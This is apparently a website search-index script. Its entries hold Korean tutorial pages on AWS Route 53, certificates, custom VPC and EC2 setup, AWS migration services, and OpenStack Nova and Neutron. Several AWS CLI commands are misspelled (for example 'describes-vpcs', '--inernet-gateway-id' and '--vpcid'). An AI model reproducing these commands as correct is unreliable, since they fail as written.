IP를 지정하여 라우팅 가능, 값을 다수 지정한 경우 무작위로 반환함 Weighted : Region 별 부하 분산 가능, 각 가중치를 가진 동일한 이름의 A 레코드를 만들어 IP를 다르게 줌 Latency-based : 지연 시간이 가장 적은, 즉 응답시간이 가장 빠른 리전으로 쿼리를 요청 Failover : A/S 설정에서 사용됨, Main과 DR로 나누어 Main 장애시 DR로 쿼리 Geolocation : 각 지역을 기반으로 가장 가까운 리전으로 쿼리 수행, 레코드 생성시 지역을 지정할 수 있음 Geo-proximity : Traffic flow를 이용한 사용자 정의 DNS 쿼리 생성 가능 Multi-value answer : 다수의 IP를 지정한다는 것은 simpl와 비슷하지만 health check가 가능 ( 실패시 자동 Failover )     \rAWS Route 사용방법\r...\r\r AWS Route 사용방법  AWS 서비스에 route를 검색 후 Route 53을 선택한다.   Route 53의 원하는 서비스를 선택한다.    각 서비스의 간략한 설명   도메인 등록  단순 도메인을 구입하여 등록한다.    트래픽 흐름 처리  트래픽 처리 등의 룰을 추가한다.    DNS 관리  호스트 도메인을 등록한다    모니터링 서비스는 DNS 흐름 프로세스를 모니터링 하는 서비스 \r\r\r    \rAWS 콘솔 SSL/ TLS 설치\r...\r\r AWS 콘솔 SSL/ TLS 설치   AWS 서비스에서 certificate 검색   인증서를 만들 것인지 혹은 사설 인증기관을 사용할 것인지를 선택   프로비저닝이 선택할 경우  기존의 다른 업체에서 이미 발급받은 경우 Certificate Manager을 통해 등록이 가능하며, 무료로 발급도 가능    적용시킬 도메인 이름 선택    DNS 검증 : Certificate Manager에서 제시하는 특정 레코드를 추가해서 본임임을 인증 이메일 검증 : 해당 도메인의 관리자 계정으로 이메일을 보내서 본임임을 인증, 이 방법을 이용하기 위해서는 해당 도메인의 메일 서버에 연동되어 있어야 가능    검증방법 선택  요청이 완료되면 해당 도메인에 다음과 같은 이름과 값으로 CNAME 기록을 추가 해야 하며, AWS가 아닌 업체를 통해서 했다면 해당 업체의 사이트에서 레코드를 추가하면 되며, Route 53을 통해 자동으로 레코드 생성이 가능     발급한 인증서를 로드 밸런서의의 기존에 생성했던 리스너를 추가시킨 후, 인증서를 추가하면 추가가 완료된 것을 확인할 수 있으며, http://가 아닌 https:// 접속이 가능한 것을 확인할 수 있다.  \r\r\r  "});index.add({'id':52,'href':'/docs/cloudcomputing/awstraining/vpc/','title':"AWS 사용자 정의 VPC 생성",'content':"AWS 사용자 정의 VPC 생성    AWS 사용자 정의 VPC 생성    이제 본격적으로 AWS 서비스들에 대해서 다루어 보겠습니다. 그 중, AWS 서비스의 근간이 VPC를 생성해 보도록 하겠습니다. VPC 중요한 개념이므로, VPC에 대한 개념이 부족한 분들은은 AWS VPC를 참고해주세요.     GUI 환경에서의 사용자 정의 VPC 생성   기본적인 VPC 생성의 순서\n1. VPC 네트워크 생성 2. Internet Gateway 설정\n2. Subnet 설정\n3. Route Table 설정\n5. Network ACL 설정\n6. Security Group 설정 여기에서는 ACL은 기본 값, Security Group에 대한 설정은 인스턴스를 생성할 때 설정하였습니다.\n   AWS 서비스에서 VPC를 검색합니다.      VPC 대시보드에서는 VPC서비스의 전체적인 서비스 상태를 확인할 수 있습니다. 좌측 메뉴에서 VPC 생성을 위해 VPC를 선택합니다.      AWS 가입시 기본적으로 기본 VPC가 생성되며, Custom VPC를 생성하기 위해 VPC 생성을 클릭합니다.      VPC 생성을 위해 VPC의 이름과 주소대역을 CIDR 형식으로 작성합니다.      생성이 완료되었습니다. 이제 인터넷에 연결하기 위해 인터넷 게이트웨이로 이동합니다.      인터넷 게이트 웨이를 생성합니다.      인터넷 게이트 웨이 생성 후, VPC를 연결합니다.      이제 서브넷 대역을 생성하기 위해 서브넷을 선택합니다.      현재 기본 VPC의 서브넷 대역이 3개가 존재합니다. 새로 생성한 Custom-VPC의 서브넷을 생성하기 위해 서브넷 생성을 클릭합니다.      저는 퍼블릭 대역 10.0.0.0/24와 프라이빗 10.0.10.0/24의 서브넷 대역을 생성해보겠습니다.      생성이 완료된 후, 라우팅 설정을 위해 라우팅 테이블을 클릭합니다.      퍼블릭, 프라이빗 라우팅 테이블을 생성합니다.      퍼블릭에서 하단에 서브넷 연결을 클릭 후, 서브넷 연결 편집에서 퍼블릭 서브넷을 등록시킵니다. 이와 동일하기 프라이빗 라우팅 테이블에 프라이빗 서브넷을 등록시킵니다.      서브넷 생성을 완료 후, 서브넷 연결의 좌측에 라우팅 편집을 클릭합니다.      퍼블릭과 프라이빗을 인터넷 게이트웨이에 연결시킵니다. 이것으로 GUI를 통한 VPC의 생성이 완료되었습니다. 다음 장에서 생성된 VPC대역에 인스턴스를 생성해보겠습니다.     AWS CLI로 VPC 생성   이번에는 VPC를 CLI 환경을 통해 생성해보도록 하겠습니다. CLI환경 또한 동일한 순서로 생성을 진행하겠습니다.   $ aws ec2 create-vpc --cidr-block 10.0.0.0/16\r# 10.0.0.0/16의 CIDR을 가진 VPC를 생성합니다.\r$ aws ec2 modify-vpc-attribute --vpc-id [ VPC-ID ] --enable-dns-hostnames\r# [ VPC-ID ]를 가진 VPC에 DNS를 사용하도록 설정합니다.\r$ aws ec2 create-vpc --cidr-block 10.0.0.0/16 --instance-tenancy dedicated\r# 만약 vpc 네트워크의 Tenanacy를 Dedicated로 생성한다면 다음의 명령어를 통해 실행시킵니다.\r VPC를 생성 및 설정합니다.     $ aws ec2 create-internet-gateway\r# 인터넷 게이트웨이를 생성합니다.\r$ aws ec2 attach-internet-gateway --internet-gateway-id [ igw ID ] --vpc-id [ VPC ID ]\r# VPC ID에 해당하는 VPC에 igw ID에 해당하는 인터넷 게이트웨이를 연결시킵니다.\r 인터넷 게이트웨이를 생성합니다.     $ aws ec2 create-subnet --vpc-id [ VPC-ID ] --availability-zone ap-northeast-2a --cidr-block 10.0.0.0/24\r# VPC-ID에 해당하는 VPC에 ap-northeast-2a에 가용영역에서 10.0.0.0/24에 subnet을 생성합니다.\r$ aws ec2 create-subnet --vpc-id [ VPC-ID ] --availability-zone ap-northeast-2c --cidr-block 10.0.10.0/24\r# VPC-ID에 해당하는 VPC에 ap-northeast-2c에 가용영역에서 10.0.10.0/24에 subnet을 생성합니다.\r subnet을 생성 및 설정합니다.     $ aws ec2 create-route-table --vpc-id [ VPC-ID ]\r# VPC-ID에 해당하는 VPC에 route table을 생성합니다.\r$ aws ec2 associate-route-table --route-table-id [ rtb-id ] --subnet-id [ subnet-id ]\r# rtb-id에 해당하는 route table에 subnet-id에 해당하는 subnet을 등록시킵니다.\r$ aws ec2 create-route --route-table-id [ rtb-id ] --destination-cidr-block 0.0.0.0/0 --gateway-id [ igw-id ]\r# rtb-id에 해당하는 route table에 모든 게이트웨이를 [ igw-id ]에 연결합니다.\r Route table을 생성 및 설정합니다.     $ aws ec2 describes-vpcs --vpc-id [ VPC-id ]\r$ aws ec2 describes-subnets --subnet-id [ subnet-id ]\r$ aws ec2 describes-internet-gateway --inernet-gateway-id [ igw-id ]\r$ aws ec2 describes-route-tables --route-table-id [ rtb-id ]\r# 생성 및 설정 확인\r 생성 및 설정을 확인합니다.    다음 장에서는 이번에 생성한 VPC를 사용하여, EC2를 생성해보도록 하겠습니다.  "});index.add({'id':53,'href':'/docs/cloudcomputing/googlecloudplatform/','title':"Google Cloud Platform",'content':" 정리 중\n"});index.add({'id':54,'href':'/docs/cloudcomputing/openstack/nova/','title':"Nova",'content':"가상의 서버를 생성하는 서비스 : Nova   가상의 서버를 생성하는 서비스 : Nova   Nova는 compute 서비스의 핵심 compute 서비스란, 가상머신이 필요한 자원을 할당하고, 관리하는 서비스로 하이퍼바이저, 메시지 Queue, 인스턴스 접속을 하는 콘솔 등의 다양한 기능이 유기적으로 연결되어 가상 서버를 생성할 수 있는 시스템을 구성하는 시스템     Nova 서비스의 고려사항     고려사항 설명     CPU compute 서비스가 동작할 호스트 시스템의 cpu가 기본적으로 자체 하드웨어 가상화를 지원이 필수   Hypervisor 서비스에 사용할 하이퍼바이저를 맞게 설정해야 하며, 기본적으로 사용하는 Hypervisor은 KVM/QEMU   Storage compute 서비스를 통해 인스턴스가 생성되면서 시스템의 디스크 용량의 제한을 가할 수 있음, 이를 위해 넉넉한 공간이 필요   Overcommit 기본적으로 자원을 할당하는 경우 1:1이 아닌 CPU는 16:1, Memory는 1.5:1로 할당 되어짐   네트워킹 생성된 인스턴스의 경우 nova가 독자적으로 구현하는 것이 아닌 다른 network 서비스를 연게해서 사용해야하며, 주로 Neutron 네트워크 서비스와 함께 사용       Nova의 논리 아키텍처      서비스 역할     nova-api 최종 사용자즈이 API콜을 통해 서비스 간 질의 응답을 담당   nova-compute 가상화 API를 이용하여 가상 머신 인스턴스를 생성하고 종료하는 역할을 수행   nova-scheduler compute host가 다수인 경우 큐를 통해 받은 메시지를 누구에게 명령할 것인지를 결정   nova-conductor 코디네이션과 데이터베이스 쿼리를 지원하는 서버 데몬   nova-cert X509 인증서에 대한 Nova Cert서비스를 제공하는 서버 데몬   nova-consoleauth 데몬, 콘솔 프록시를 제공하는 사용자에 대한 인증 토큰 제공   Guest Agent 실제 compute 시스템 상에 구축된 인스턴스로 Nova-compute 서비스에 의해 제어되어짐   nova-api-metadata 인스턴스의 메타데이터의 요청을 처리   nova-novncproxy VNC 콘솔화면을 제공   nova-novaclient: nova REST API를 사용하는 클라이언트 프로그램    nova-network 인스턴스의 네트워크 기능을 수행   nova-compute-kvm 인스턴스(가상 머신)와 관련된 모든 프로세스를 처리   python-guestfs 파일 생성 기능을 지원하는 Python 라이브러리   qemu-kvm KVM 하이퍼바이저      위와 같이 많은 서비스들이 존재    Nova는 대시보드나 콘솔에서 호출하는 nova-api에서 시작 Queue를 이용해 nova-compute에 인스턴스를 생성하라는 명령을 전달 nova-compute는 하이퍼바이저 라이브러리를 이용해 하이퍼바이저에 인스턴스를 생성하려는 명령어를 전달 Hypervisor을 통해 인스턴스를 생성 생성된 인스턴스는 nova-api로 접근할 수 있으며 Nova의 모든 기능은 메시지 Queue로 처리할 수 있음     Nova가 지원하는 하이퍼바이저의 종류  기본 하이퍼바이저는 KVM과 QEMU 프로바이더가 테스트하는 Hyper-V, VMware, XenServer, Sen via libvirt 몇 번의 테스트만 하는 하이퍼바이저 드라이버인 베어메탈, Docker, LXC via libvirt    "});index.add({'id':55,'href':'/docs/programing/shell/shell-5/','title':"Shell 5",'content':"****    ****         #\n"});index.add({'id':56,'href':'/docs/cloudcomputing/awstraining/ec2/','title':"AWS EC2 생성",'content':"AWS EC2 생성    AWS EC2 생성    이번 장에서는 저번 장에서 생성했던 사용자 정의 VPC의 대역에 EC2를 생성해 보도록 하겠습니다. EC2 또한 중요한 개념이므로, EC2에 대한 학습을 원하는 분들은 AWS EC2를 참고해주세요.      EC2 ( Elastic Compute Cloud ) 생성   기본적인 EC2 생성의 순서\n1. AMI ( Amazon Machin Image ) 선택 2. Instance type 선택\n2. Instance Network 설정\n3. Storage 설정\n5. Tag 설정\n6. Security Group 설정 여기에서는 처음에는 기본 VPC, 후에는 전장에서 생성했던 VPC에 생성해보도록 하겠습니다..   검색에서 EC2를 입력후 인스턴스로 들어갑니다.      대시보드에서 현재 사용량을 확인할 수 있습니다. 인스턴스 생성을 위해 좌측 메뉴에 인스턴스를 클릭합니다.      인스턴스 시작을 클릭합니다.      AMI 선택에서는 이미지 파일을 선택할 수 있습니다. 여기에서는 Amzon Linux를 생성하겠습니다. 또한 AMI는 직접 만들 수 있으며, AWS Marketplace를 통해서 타 유저의 이미지를 구매할 수도 있습니다.      AWS 인스턴스 유형에서는 cpu, ram 스토리지의 유형과 사양 등을 선택할 수 있습니다. 여기에서는 과금이 발생하지 않게 t2.micro를 선택하겠습니다.      인스턴스 세부 정보 구성에서는 인스턴스의 수, VPC 서비넷 대역, 용량 예약, IAM 역할 등 세부 정보를 설정할 수 있습니다. 여기서는 기본 값으로 생성하겠습니다.      설정 항목 설명     인스턴스 갯수 기동할 인스턴스의 수를 나타냅니다.   구매 옵션 구매 옵션을 선택합니다. 체크 시 스팟 인스턴스로 구입할 수 있습니다.   네트워크 인스턴스를 기동할 VPC를 나타냅니다.   서브넷 인스턴스가 소속될 서브넷을 나타냅니다.   퍼블릭 IP 자동 할당 자동적으로 퍼블릭 IP를 부여할지 설정합니다.   배치 그룹에 인스턴스 추가 배치 그룹을 선택합니다. 체크 시 배치 그룹에서 인스턴스를 생성합니다.   용량 예약 용량 예약은 특정 가용 영역에서 인스턴스가 시작되도록 예약합니다.   IAM 역할 EC2 인스턴스에 부여할 IAM권한을 설정합니다.   종료 방지 EC2 인스턴스의 삭제를 막습니다.   모니터링 CloudWatch를 통한 모니터링 서비스를 활성화합니다. 화성화하면 1분 간격으로 CloudWatch에 데이터가 전송됩니다. ( 일반적으로 5분 간격을 설정 )   테넌시 하드웨어 점유 옵션으로, Shred를 선택시 공유, Dedicated를 선택하면 완전 점유합니다.   사용자 데이터 인스턴스 실행시 셀 스크립트 또는 cloud-init 디렉티브를 작성할 수 있습니다.         스토리지 추가에서는 볼륨을 추가할 수 있습니다.      태그 추가에서는, 인스턴스에 대한 세부사항을 정의할 수 있습니다. 여기서는 기본 값으로 생성하겠습니다.      보안 그룹에서는 생성되는 EC2에 대한 보안 그룹을 지정합니다. 현재는 접속을 위해 TCP 22번 포트만 열어둔 상태로 생성하겠습니다.      검사에서는 현재까지의 설정을 확인할 수 있습니다. 인스턴스 시작을 누르면 키 페어를 선택창이 등장합니다. 여기서는 키 페어를 하나 생성하도록 하겠습니다.      리눅스 운영체제를 통할 때에는 pem 파일을, Window를 사용할 때에는 ppk 파일을 사용하기에, 여기서는 pem 파일을 Putty key generator를 이용해 변경시켰습니다.      생성이 완료되면, 인스턴스로 돌아와 생성되어진 인스턴스를 확인합니다. 기본적으로 Pendig은 생성, Running은 실행가능, stop은 중지상태, shuttinf-down은 삭제 중, Terminated는 삭제된 상태를 의미하며, Running 상태에서만 요금이 부과됩니다. 상단에는 간략한 EC2들의 정보를 나타내며, 하단에는 상세 정보를 나타냅니다. 여기서 접속을 위해 IPv4 퍼블릭 IP를 복사합니다.      Putty를 사용해 퍼블릭 IP와 프라이빗 키를 등록하면 접속이 가능합니다. 기본적으로 기본 계정은 AWS Linux : EC2-user, Ubuntu : ubuntu Centos : centos 입니다.      생성된 인스턴스에서 정상적으로 핑이 나가는 것을 확인하실 수 있으나, Window에서는 핑이 가지 않는 것을 확인하실 수 있습니다. 이는 전에 선택한 보안그룹으로 22번/TCP 포트밖에 사용하지 않았기 때문으로, 만약 보안그룹에 ICMP를 열어둔다면, Ping이 가능하게 할 수 있습니다. 이와 같이 보안그룹은 AWS에서 다방면으로 매우 중요한 역할을 수행합니다.      이어서 인스턴스의 상태변경은 인스턴스를 선택후 작업, 혹은 오른쪽마우스로 가능합니다. 저는 삭제를 위해 종료를 클릭하겠습니다.      삭제가 완료되었습니다.     사용자 정의 VPC 대역에 EC2 생성    저번 장에서 생성했던 VPC 대역에 EC2를 생성해보도록 하겠습니다. 인스턴스의 Network 설정까지는 동일하며, 그 후는 아래와 같습니다.    인스턴스의 Network 설정에서 네트워크, 서브넷, 퍼블릭 IP 자동할당을 설정합니다. 단, 두 개의 인스턴스를 생성하며, 하나의 인스턴스는 IP 자동할당 활성화, 다른 인스턴스는 IP자동할당을 비활성화인 채로 생성합니다. 여기에서는 저번장에서 생성한 2개의 서브넷을 사용했습니다. Pulbic : 할당 활성화, Private : 할당 비활성화 또한 위와 같이 ssh의 접속이 가능하게 보안그룹을 설정합니다.      생성이 완료되었습니다.      이제 Putty를 통해 퍼블릭과 프라이빗에 접속합니다. 하지만, 프라이빗 대역은 퍼블릭 IP를 할당받지 않아 접속이 불가능합니다.      하지만 퍼블릭 서브넷의 인스턴스는 공통의 라우팅 테이블로 igw를 사용하기 때문에 프라이빗 IP를 알수 있어 접속이 가능합니다. 또한 이와 같은 방법으로 보안그룹을 ssh접속이 가능한 한 컴퓨터만 혹은 서브넷이나 그룹등을 지정하거나, gateway를 특정 인스턴스로 지정하여 보안성을 높이는 것이 가능합니다.     CLI를 통한 인스턴스 관리     $ aws ec2 help\r aws ec2에 명령어를 알려줍니다.     $ aws ec2 create-key-pair --key-name [ 키 페어 이름 ] --query \u0026#39;KeyMaterial\u0026#39; --output text | out-file \u0026gt; [ 키 페어 경로 ].pem\r# KeyMaterial은 키의 값입니다.\r$ impkey=\u0026#39;cat~/[ import 시킬 키 파일의 경로 ]\u0026#39;\r$ aws ec2 import-key-pair --key-name [ 키 페어 이름 ] --public-key-material ${impkey}\r# 외부 키 페어 임포트 방법\r# AWS 콘솔 EC2-Key Pairs -\u0026gt; Import Key Pair로도 가능합니다.\r 키 페어를 생성합니다.     $ aws ec2 delete-key-pair --key-name [ 키 페어 이름 ]\r 키 페어를 삭제합니다.     $ aws ec2 create-security-group --group-name [ 보안 그룹 이름 ] --description [ 보안 그룹 설명 ] --vpcid [ VPC ID ]\r 보안 그룹을 생성합니다.     $ aws ec2 authorize-security-group-ingress \\\r--group-id [ Security-group-id ] \\\r--protocol tcp \\\r--port 22 \\\r--cidr 0.0.0.0/0\r# Security-group-id의 보안 그룹의 22/tcp의 모든 접속이 가능하게 설정을 추가합니다.\r$ aws ec2 describe-security-groups \\\r--group-ids [ Security-group-id ] \\\r--output json\r 보안 그룹을 생성합니다.     $ aws ec2 describe-security-groups --group-ids [ 보안 그룹 ID ]\r 보안 그룹의 상세 설명을 출력합니다.     $ aws ec2 create-security-group --group-name [ 보안 그룹 이름 ] --description [ 보안 그룹 설명 ]\r EC2를 생성할 때, 보안 그룹을 생성합니다.     $ aws ec2 run-instances \\\r--image-id [ 이미지 이름 ] \\\r--count [ 인스턴스 수 ] \\\r--instance-type [ falvor ] \\ --key [ 키 페어 이름 ] \\\r--security-group-ids [ 보안 그룹 ID ]\r--subnet-id [ 서브넷 ID ] \\\r--associate-public-ip-addres # 퍼블릭 IP 할당 유무\r--user-data file://[ 파일경로 ]\r# 인스턴스를 생성합니다.\r$ aws ec2 create-tags \\\r--resources [ 인스턴스 id ]\r--tags Key=name,Value=[ 태그 내용 ]\r# 인스턴스에 태그 등록\r 인스턴스를 생성합니다.   #!/bin/bash\rapt install -y apache2\r#cloud-config\rpackages:\r- apache2\r user data 사용시 사용가능한 형식     aws ec2 describe-instances --filters \u0026#34;[ 필터 값 ], Value=[ 값1, 값2 ]\u0026#34;\r 특정 ec2를 나열합니다.     aws ec2 start-instances --instance-ids [ 인스턴스 ID ]\raws ec2 stop-instances --instance-ids [ 인스턴스 ID ]\raws ec2 terminate-instances --instance-ids [ 인스턴스 ID ]\r 인스턴스의 상태를 변경합니다.     예제   예제 1. 다음의 인스턴스를 생성해보세요.  1. OS : Ubuntu18.04\n2. Instance-type : t2.micro\n3. Instance-count : 2\n4. Network : 기본 VPC 및 기본 Subnet\n5. Security-Group : 80/tcp, 22/tcp의 포트가 모두 접속할 수 있게 설정해주세요.\n6. 새로운 Key-pair를 생성하여 접속 후, Apache2를 설치하세요.\n7. 각각의 인스턴스에 접속하여 확인합니다.\n    예제 2. 다음의 인스턴스를 생성해보세요.  1. OS : Ubuntu16.04\n2. Instance-type : t2.micro\n3. Instance-count : 1\n4. Network : 사용자 생성 VPC 및 Subnet\n5. User-data에 값을 입력하여 자동으로 Apache가 설치되게 설정하세요.\n6. Security-Group : 80/tcp 포트만 모두 접속할 수 있게 설정해주세요.\n7. 기존에 Key-pair로 생성하세요.\n8. 인스턴에 접속하여 확인합니다.\n "});index.add({'id':57,'href':'/docs/cloudcomputing/amazonwebservice/aws_migrate/','title':"AWS Migrate",'content':"AWS Migrate   AWS Application Discovery Service    AWS Application Discovery Service는 서버로부터 구성, 사용 및 동작 데이터를 수집하여 제공함으로써 워크로를 효율적 관리를 도와주는 서비스 기업의 고객이 사내 데이터 센터에 대한 정보를 수집하여 마이그레이션 프로젝트를 계획하는 데 도움을 줌 데이터 센터 마이그레이션을 계획하는 작업에는 상호 의존성이 높은 수천 개의 워크로드가 수반 되어지는 짐 수집된 데이터는 AWS Application Discovey Service 데이터 스토어에 암호화된 형태로 보관되어짐   AWS Application Discovery Service의 이점  마이그레이션 계획 수립을 위한 신뢰할 수 있는 검색  Application Discovey Service는 서버 사양 정보, 성능 데이터, 실행 프로세스 및 네트워크 연결 세부 정보를 수집, 이러한 데이터는 AWS로 마이그레이션하기 전에 상세한 비용 추정을 수행하거나 계획을 위해 서버를 애플리케이션으로 그룹화하는 데 사용될 수 있음   Migration Hub와 통합  AWS Application Discovery Service는 AWS Migration Hub와 통합되므로 마이그레이션 추적이 간소화 및 Hub를 통한 마이그레이션 상태 추적이 가능   암호화로 데이터 보호  AWS Application Discovery Service는 수집한 데이터를 AWS로 전송할 때와 Application Discovery Service 데이터 스토어에 저장할 때 모두 암호화   마이그레이션 전문가의 지원  AWS Professional Services와 APN 마이그레이션 파트너는 수많은 엔터프라이즈 고객이 클라우드로의 마이그레이션을 성공적으로 완료하도록 지원     AWS DMS ( Database Migration Service )    AWS Database Migration Service는 데이터베이스를 AWS로 빠르고 안전하게 마이그레이션할 수 있도록 지원하는 서비스 이그레이션하는 동안 소스 데이터베이스가 변함없이 운영되어 해당 데이터베이스를 사용하는 애플리케이션의 가동 중지 시간을 최소화 AWS Database Migration Service는 Oracle에서 Oracle로의 마이그레이션과 같은 동종 마이그레이션뿐 아니라 Oracle 또는 Microsoft SQL Server에서 Amazon Aurora로의 마이그레이션과 같은 이기종 데이터베이스 플랫폼 간의 마이그레이션도 지원 데이터베이스를 Amazon Aurora, Amazon Redshift, Amazon DynamoDB 또는 Amazon DocumentDB(MongoDB 호환 가능)로 마이그레이션하는 경우 6개월 동안 DMS를 무료로 제공   AWS DMS의 이점  간편한 사용  AWS Management Console에서 클릭 몇 번으로 데이터베이스 마이그레이션을 시작 마이그레이션이 시작되면, 마이그레이션 프로세스 도중에 소스 데이터베이스에 발생한 데이터 변경을 자동으로 복제하는 것을 비롯하여 마이그레이션 프로세스의 모든 복잡성을 DMS에서 관리   최소한의 가동 중단  AWS Database Migration Service는 사실상 가동 중단 시간 없이 데이터베이스를 AWS로 마이그레이션하도록 지원 마이그레이션하는 동안 소스 데이터베이스에 발생한 모든 데이터 변경 사항은 지속적으로 대상 데이터베이스에 복제되므로, 마이그레이션하는 동안 소스 데이터베이스가 변함없이 운영   널리 사용되는 데이터베이스 지원  AWS Database Migration Service를 사용하면 가장 널리 사용되는 상용 및 오픈 소스 데이터베이스 플랫폼에서 또는 이를 대상으로 데이터를 마이그레이션 가능   저렴한 비용  마이그레이션 프로세스 중에 사용한 컴퓨팅 리소스와 추가 로그 스토리지에 대한 비용만 지불 라바이트 규모의 데이터베이스를 3 USD라는 저렴한 비용   빠르고 쉬운 설정  마이그레이션 태스크는 AWS Database Migration Service가 마이그레이션을 실행하는 데 사용할 파라미터를 정의하는 곳 마이그레이션 태스크에는 소스 및 대상 데이터베이스에 대한 연결 설정과 더불어 마이그레이션 프로세스를 실행하는 데 사용할 복제 인스턴스 선택이 포함 동일한 태스크를 사용하여 실제로 마이그레이션을 수행하기 전에 테스트를 실행가능   안정성  AWS Database Migration Service는 복원력과 자가 복구 기능 존재 소스 및 대상 데이터베이스, 네트워크 연결성 및 복제 인스턴스를 지속적으로 모니터링     AWS SMS ( Server Migration Service )    AWS Server Migration Service는 온프레미스 VMware vSphere, Microsoft Hyper-V/SCVMM 및 Azure 가상 머신을 AWS 클라우드로 자동으로 마이그레이션하는 서비스 AWS SMS는 서버 VM을 Amazon EC2에 바로 배포할 수 있는 클라우드 호스팅된 Amazon 머신 이미지(AMI)를 증분 방식으로 복제하는 서비스   AWS SMS의 이점  클라우드 마이그레이션 프로세스가 단순화  마이그레이션이 시작되면 AWS SMS은(는) 복잡한 마이그레이션 프로세스를 관리하여 라이브 서버 볼륨의 AWS로 복제하고 새로운 AMI를 정기적으로 생성하는 작업 등을 자동화   여러 서버 마이그레이션 조율  AWS SMS는 복제 일정을 예약하고 애플리케이션을 구성하는 서버 그룹에 대한 진행 상황을 추적할 수 있도록 하여 서버 마이그레이션을 조율가능   서버 마이그레이션 증분 테스트  증분 복제 지원 기능을 통해 AWS SMS은(는) 마이그레이션된 서버에 대한 테스트를 신속하게 수행하고 확장가능 AWS SMS은(는) 증분 변경 사항을 온프레미스 서버에 복제한 후 그 차이만 클라우드로 전송하기 때문에 일부 변경 사항만 반복적으로 테스트를 통해 절약 가능   가장 많이 사용되는 운영 체제 지원  Windows 및 대표적인 몇 가지 Linux 배포판을 포함하는 운영 체제 이미지 복제를 지원   가동 중지 최소화  증분 AWS SMS 복제는 최종 전환 중 애플리케이션 가동 중지로 인한 비즈니스 영향을 최소화     AWS SMS 제한사항\n 고객이 한도 증가를 요청하지 않는 한, 계정당 50개의 VM을 동시에 마이그레이션 VM의 최초 복제부터 시작하여 VM당(계정당 아님) 90일의 서비스 사용 기간. 고객이 한도 증가를 요청하지 않는 한, 90일 후에는 진행 중인 복제를 종료 정당 50개의 동시 애플리케이션 마이그레이션 ( 각 애플리케이션에 대해 그룹 10개 및 서버 50개 제한 ) \r\r   AWS Snowball Edge    AWS Snowball Edge는 데이터 마이그레이션 및 엣지 컴퓨팅 디바이스이며, 두 가지 옵션으로 제공 페타바이트급 대용량 데이터를 전송하기 위한 서비스 Snowball Edge는 특정 Amazon EC2 인스턴스 유형과 AWS Lambda 함수를 지원하므로 고객은 AWS에서 개발하고 테스트한 후 원격 위치의 디바이스에 애플리케이션을 배포하여 데이터를 수집, 사전 처리 및 반환가능 서비스와 더불어 물리적인 실체가 있는 장비가 존재하여 AWS에 요청하면 Snow ball를 배송받고 On-premise의 데이터를 빠르게 Snowball로 이동시킨 뒤, 작업이 완료되면 이 물리 장비를 다시 AWS로 배송하고 S3 Bucket에 저장함 스토리지 용량은 최대 80TB까지 저장 가능   Snowball 이외에 기능이 추가된 Snowball Edge가 사용하는 경우  페타바이트 규모의 데이터를 AWS로 이송하는 경우 적합 VPN, Direct Connect, S3를 통한 직접적인 전송을 이용하기엔 데이터의 양이 많을 경우 Snowball을 사용하는 것이 좋음 또한 물리적으로 격리된 환경이거나 인터넷 환경이 좋지 않을 경우 사용 평균적으로 AWS로 데이터를 업로드하는데 1주일 이상이 소요되는 경우 Snowball 사용을 검토함   AWS Snoball의 이점  용이한 데이터 이동  Snowball Edge는 약 1주 만에 테라바이트 규모의 데이터를 이동 네트워크 조건이 AWS에서 대규모 데이터를 송수신하는 데 현실적으로 적합하지 않은 경우, 이를 사용하여 데이터베이스, 백업, 아카이브, 의료서비스 레코드, 분석 데이터 세트, IoT 센서 데이터 및 미디어 콘텐츠를 이동   간편한 사용  AWS에서 사전에 프로비저닝된 Snowball Edge 디바이스를 고객 위치로 자동으로 배송 디바이스를 반환할 준비가 되면, 전자 잉크 선적 레이블이 자동으로 업데이트되고 화물 운송업체가 업로드가 시작되는 올바른 AWS 시설로 운송   로컬에서 데이터 처리 및 분석  EC2 AMI를 실행하고 AWS Lambda 코드를 Snowball Edge에 배포하여 기계 학습 또는 다른 애플리케이션을 통한 로컬 처리나 분석을 실행 개발자와 관리자는 네트워크 연결 없이 일관된 AWS 환경으로 디바이스에서 직접 애플리케이션을 실행가능   독립형 스토리지  Snowball Edge 디바이스는 NFS(파일 공유 프로토콜) 또는 객체 스토리지 인터페이스(S3 API)를 통해 기존 온프레미스 애플리케이션에 로컬 스토리지를 제공   보안  Snowball Edge 디바이스는 변조 방지 엔클로저, 256-비트 암호화, 그리고 데이터의 보안 및 관리의 연속성을 보장하도록 설계된 업계 표준 Trusted Platform Module(TPM)을 사용   확장성  Snowball Edge 디바이스는 테라바이트 규모의 데이터를 전송할 수 있으며, 여러 대의 디바이스를 병렬로 사용하거나 함께 클러스터링하여 AWS에서 페타바이트 규모의 데이터를 송수신    "});index.add({'id':58,'href':'/docs/cloudcomputing/gcptraining/','title':"GCP Training",'content':" 정리 중\n"});index.add({'id':59,'href':'/docs/cloudcomputing/openstack/neutron/','title':"Neutron",'content':"네트워크를 관리하는 서비스: Neutron   네트워크를 관리하는 서비스: Neutron  Neutron은 네트워크 서비스로 여러 노드에 여러 프로세스를 배치하는 독립형 서비스 프로세스는 서로 및 다른 OpenStack의 서비스와 상화 작용     Neutron의 논리 아키텍처      구성요소 기능     neutron-server network api의 기능 및 네트워크 확장 기능을 서비스하며, 각 포트의 대한 모델 및 Pfmf 지정, AMQP를 사용하여 데이터베이스와 통신하는 플러그인을 통해 수행   neutron-L2-agent OVS 가상 Bridge 사이에서데이터 패킷을 전달하기 위한 중계장치   neutron-l3-agent 태넌트 네트워크에서 VM의 외부 네트워크 엑세서를 위한 L3/ NAT 전달을 제공   neutron-dhcp-agent 테넌트 네트워크에 DHCP 서비스를 제공, DHCP agent는 메시지 큐에 엑세스할 수 있는 권한이 필요   Queue 다른 서비스 간의 통신의 역할을 수행   Neutron Database Neutron 서비스를 수행하기 위한 일련의 정보들은 보관, 관리하는 DB   Neutron 3rd Party Plugin Neutron 서비스의 안정적인 통신 역할을 수행   plugin agent 각 compute node에서 실행되며 로컬 vswitch을 구성 및 관리   network provider services 테넌트 네트워크에 추가 네트워킹 서비스를 제공      Neutron은 다양한 네트워크 플러그인이나 네트워크 모델을 지원 사용자는 Neutron API를 이용해 neutron-server로 IP 할당을 요청 neutron-server 들어온 요청을 Queue로 다시 요청 Queue는 neutron-dhcp-agent와 Neutron 3rd Party plugin으로 IP 할당 지시를 내림 neutron-dhcp-agent와 Neutron 3rd Party Plugin은 지시 받은 작업 수행을 시작 neutron-server는 수시로 작업 상태를 Neutron database에 저장 할당된 IP를 인스턴스에서 사용 가능     Neutron의 네트워킹 프로세스   neutron-server에 의해 명령을 요청을 받음 plugin을 토대로 Messae queue를 통해 각 agent의 기능을 수행 이와 함께 SDN 서비스를 수행     Neutron network의 종류      